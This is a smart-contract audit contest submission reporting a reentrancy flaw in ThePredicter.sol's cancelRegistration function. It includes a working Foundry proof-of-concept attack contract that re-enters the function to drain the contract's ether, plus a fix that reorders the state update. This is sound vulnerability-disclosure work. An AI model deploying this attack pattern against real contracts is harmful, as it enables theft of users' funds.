## The Predicter
[https://codehawks.cyfrin.io/c/2024-07-the-predicter/s/52]

100
EXP

Jul 18th, 2024 → Jul 25th, 2024

## Submission Details
Severity: **High**

## Reentrancy attacks in 'ThePredicter.sol::cancelRegistration' lead the attacker to draining funds from this contract.

firmanregar

## Summary
`cancelRegistration` function is vulnerable due to the state update happening after the external call.

## Vulnerability Details
`cancelRegistration` Function:
```solidity
function cancelRegistration() public {
    if (playersStatus[msg.sender] == Status.Pending) {
        (bool success, ) = msg.sender.call{value: entranceFee}("");
        require(success, "Failed to withdraw");
        playersStatus[msg.sender] = Status.Canceled;
        return;
    }
    revert ThePredicter__NotEligibleForWithdraw();
}
```

The state update (`playersStatus[msg.sender] = Status.Canceled;`) occurs after the external call. This can be exploited if the attacker manages to re-enter the function before the state change.

Test for `cancelRegistration` Function:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
​
import "forge-std/Test.sol";
import "../src/ThePredicter.sol";
​
contract ReentrancyAttack {
    ThePredicter public target;
    bool public attackInProgress;
​
    constructor(address _target) {
        target = ThePredicter(_target);
    }
​
    receive() external payable {
        if (attackInProgress) {
            target.cancelRegistration();
        }
    }
​
    function attack() external payable {
        attackInProgress = true;
        target.register{value: msg.value}();
        target.cancelRegistration();
    }
}
​
contract ThePredicterTest is Test {
    ThePredicter public predicter;
    ReentrancyAttack public attacker;
    address public scoreBoard = address(0x1234);
    uint256 public entranceFee = 1 ether;
    uint256 public predictionFee = 0.1 ether;
​
    function setUp() public {
        predicter = new ThePredicter(scoreBoard, entranceFee, predictionFee);
        attacker = new ReentrancyAttack(address(predicter));
    }
​
    function testReentrancyAttack() public {
        // Fund the contract with some initial balance
        vm.deal(address(predicter), 10 ether);
​
        // Fund the attacker
        vm.deal(address(attacker), 1 ether);
​
        // Start the attack
        vm.prank(address(attacker));
        attacker.attack{value: entranceFee}();
​
        // Check if the contract balance is drained
        assertEq(address(predicter).balance, 0);
    }
}
```

## Impact
This sequence allows for potential reentrancy attacks, where an external contract can recursively call back into the original contract before the initial invocation completes. Such vulnerabilities can lead to various exploits, including unauthorized fund withdrawals.

## Tools Used
Manual Review

## Recommendations
I try to ensure that all state changes are finalized before executing any external calls.
```solidity
function cancelRegistration() public nonReentrant {
        if (playersStatus[msg.sender] == Status.Pending) {
            playersStatus[msg.sender] = Status.Canceled; // State change before making the external call
            (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
}
```

This function updates the `playersStatus` to Canceled before making the external call. This prevents reentrancy as the state change happens before the call.
